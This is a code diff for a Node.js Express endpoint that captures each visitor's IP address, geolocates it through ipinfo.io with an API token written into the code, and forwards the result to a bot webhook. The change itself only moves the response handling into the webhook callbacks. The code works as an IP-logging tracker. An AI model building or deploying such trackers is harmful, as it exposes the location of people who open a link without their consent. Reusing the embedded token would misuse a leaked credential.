@@ -7,7 +7,7 @@ const botToken = process.env.bot_token;
 const channelID = process.env.channel_id;
 const port = process.env.port || 3000;
 
-async function sendWebhook(req) {
+async function sendWebhook(req, res) {
   const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const response = await fetch(`https://ipinfo.io/${ipAddress}?token=2001557f8b906a`);
   const data = await response.json();
@@ -42,10 +42,12 @@ async function sendWebhook(req) {
 
     webhook.on('error', error => {
       console.error(`Error sending webhook: ${error}`);
+      res.status(500).send('Internal server error');
     });
 
     webhook.on('success', () => {
       console.log('Webhook sent successfully');
+      res.send('Address Logged');
     });
   } catch (error) {
     console.error(`Error handling request: ${error}`);
@@ -55,8 +57,7 @@ async function sendWebhook(req) {
 
 app.get('/', async (req, res) => {
   try {
-    await sendWebhook(req);
-    res.send('Address Logged');
+    await sendWebhook(req, res);
   } catch (error) {
     console.error(`Error handling request: ${error}`);
     res.status(500).send('Internal server error');
